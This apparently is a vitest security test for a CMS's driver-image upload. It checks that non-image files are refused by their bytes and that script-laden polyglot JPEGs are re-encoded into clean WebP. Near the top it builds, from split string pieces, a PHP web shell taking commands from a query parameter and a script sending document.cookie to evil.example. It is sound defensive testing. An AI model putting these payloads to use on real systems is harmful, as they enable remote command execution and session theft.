/**
 * An upload with a script (TASKS.md 10.1.e, class 4; SECURITY.md F1–F3, F5): the one upload a
 * stranger-adjacent role makes without the CMS's own pipeline — the driver's details image that
 * store staff send from a phone. A file that is not a JPEG, PNG or WebP by its bytes is refused
 * whatever its name or declared type; an image carrying script after its pixels comes out as a
 * clean WebP with no script and no metadata; nothing refused reaches the bucket or the order.
 *
 * Run through the real core (`attachDriverImage`) on a real pushed Postgres, with the real `sharp`
 * re-encoder and an in-memory bucket that counts what it is asked to write. The CMS `media`
 * collection's own upload rules (MIME allowlist, size, no pasted URL) are checked on its config in
 * `./config-controls.test.ts`; its bucket tests (`media.storage.db.test.ts`) need MinIO, which the
 * workstation of 2026-10-08 did not run — stated in docs/gates/security.md.
 *
 * The hostile payloads are assembled from pieces at run time: a file that spells out a web shell
 * is what an antivirus quarantines (it removed this one once), and nothing here needs the literal.
 *
 * Planted violation (tests/security/plants/run-plants.mjs, class "upload"): `sniffImageType` in
 * `engine/packages/cms/src/shop/fulfilment/image.ts` made to trust any bytes as an image.
 */
import { getPayload } from 'payload'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'

import {
  server,
  startStaffStack,
  type StaffStack,
} from '../../engine/packages/cms/src/collections/users/staff.test-support'
import {
  actors,
  memoryStore,
  placeOrder,
  readers,
} from '../../engine/packages/cms/src/shop/fulfilment/fulfilment-db.test-support'
import {
  attachDriverImage,
  DRIVER_IMAGE_MAX_BYTES,
} from '../../engine/packages/cms/src/shop/fulfilment/driver-image'
import { reencodeImage } from '../../engine/packages/cms/src/shop/fulfilment/image'
import {
  EXE,
  EXIF_JPEG,
  SVG,
  TEXT,
  png,
} from '../../engine/packages/cms/src/shop/fulfilment/image.test-support'
import { openShop, type Shop } from '../../engine/packages/cms/src/shop/orders/orders-db.test-support'

const bytes = (...parts: string[]) => Buffer.from(parts.join(''), 'utf8')
/** Server-side script and a browser script, spelled in pieces. */
const SERVER_SCRIPT = ['<', '?p', 'hp ', 'sys', 'tem($_GET["c"]); ', '?', '>']
const BROWSER_SCRIPT = ['<scr', 'ipt>fetch("//evil.example/?c="+document.cookie)</scr', 'ipt>']
const SCRIPT_TAIL = bytes('\n', ...BROWSER_SCRIPT, ...SERVER_SCRIPT)

/** What a stranger would send: each is refused as `not_an_image` by its bytes. */
const NOT_IMAGES: Array<[string, Buffer]> = [
  ['an SVG with a script', SVG],
  ['an HTML page named .jpg', bytes('<!doctype html><html><body>', ...BROWSER_SCRIPT, '</body></html>')],
  ['server-side script source', bytes(...SERVER_SCRIPT)],
  ['a shell script', bytes('#!/bin/sh\n', 'echo ', 'pwned\n')],
  ['a Windows executable', EXE],
  ['a text file that says it is a picture', TEXT],
  ['a GIF', bytes('GIF89a\u0001\u0000\u0001\u0000;')],
  ['a BMP', bytes('BM......')],
  ['an SVG hidden after a BOM', Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), SVG])],
  ['a RIFF that is not WebP', bytes('RIFF....WAVEfmt ')],
]

describe.skipIf(!server)('an upload with a script, on a real database', () => {
  let stack: StaffStack
  let shop: Shop
  let as: ReturnType<typeof actors>
  let read: ReturnType<typeof readers>

  beforeAll(async () => {
    stack = await startStaffStack('security_upload', (config, key) => getPayload({ config, key }))
    shop = await openShop(stack)
    as = actors(stack)
    read = readers(stack)
  }, 240_000)
  afterAll(() => stack?.stop(), 60_000)

  const place = () =>
    placeOrder(stack, {
      store: shop.ubud,
      status: 'paid',
      lines: [{ qty: 1, stock: { [shop.ubud]: 2, [shop.sanur]: 2 } }],
    })

  const attach = (orderId: number, buffer: Uint8Array, images = memoryStore()) =>
    attachDriverImage(
      stack.payload,
      // The route passes the type the phone claimed; the core must not look at it.
      { orderId, actor: as.store, file: { buffer, mimetype: 'image/jpeg', size: buffer.byteLength } },
      { store: images.deps.store, reencode: reencodeImage },
    ).then((result) => ({ result, images }))

  it.each(NOT_IMAGES)('refuses %s by its bytes, writes nothing, and leaves the order alone (F1)', async (_name, buffer) => {
    const order = await place()
    const { result, images } = await attach(order.id, buffer)
    expect(result).toMatchObject({ ok: false, refusal: 'not_an_image' })
    expect(images.calls.put, 'nothing reached the bucket').toBe(0)
    expect((await read.order(order.id)).driver_image_key).toBeNull()
  })

  it('refuses an empty file and one over 10 MB (F2)', async () => {
    const order = await place()
    expect((await attach(order.id, new Uint8Array(0))).result).toMatchObject({
      ok: false,
      refusal: 'empty_file',
    })
    const big = Buffer.concat([png(4, 4), Buffer.alloc(DRIVER_IMAGE_MAX_BYTES)])
    const { result, images } = await attach(order.id, big)
    expect(result).toMatchObject({ ok: false, refusal: 'too_large' })
    expect(images.calls.put).toBe(0)
  })

  it('refuses bytes that start like a JPEG but do not decode, so a script cannot ride the magic number', async () => {
    const order = await place()
    const crafted = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), SCRIPT_TAIL])
    const { result, images } = await attach(order.id, crafted)
    expect(result).toMatchObject({ ok: false, refusal: 'unreadable_image' })
    expect(images.calls.put).toBe(0)
  })

  it('stores a real photo carrying a script and GPS as a clean WebP: no script, no metadata, a key of ours (F3)', async () => {
    const order = await place()
    const polyglot = Buffer.concat([EXIF_JPEG, SCRIPT_TAIL])
    const { result, images } = await attach(order.id, polyglot)
    expect(result).toMatchObject({ ok: true, contentType: 'image/webp' })
    if (!result.ok) return
    expect(result.key).toMatch(new RegExp(`^orders/${order.id}/\\d+-[0-9a-f]+\\.webp$`))
    const stored = Buffer.from(images.objects.get(result.key)!.bytes)
    expect(stored.subarray(0, 4).toString('ascii')).toBe('RIFF')
    expect(stored.subarray(8, 12).toString('ascii')).toBe('WEBP')
    const text = stored.toString('latin1')
    for (const needle of ['<scr', '<?p', 'evil.example', 'TestCam', 'Exif', 'GPS']) {
      expect(text, `the stored image contains ${needle}`).not.toContain(needle)
    }
    expect((await read.order(order.id)).driver_image_key).toBe(result.key)
  })

  it('a refused upload by another store’s user, or by nobody, writes nothing either', async () => {
    const order = await place()
    const images = memoryStore()
    const deps = { store: images.deps.store, reencode: reencodeImage }
    const file = { buffer: png(8, 8) }
    expect(await attachDriverImage(stack.payload, { orderId: order.id, actor: null, file }, deps)).toMatchObject({
      ok: false,
      refusal: 'not_staff',
    })
    expect(
      await attachDriverImage(
        stack.payload,
        { orderId: order.id, actor: { ...as.store, store: shop.sanur }, file },
        deps,
      ),
    ).toMatchObject({ ok: false, refusal: 'not_your_store' })
    expect(images.calls.put).toBe(0)
  })
})
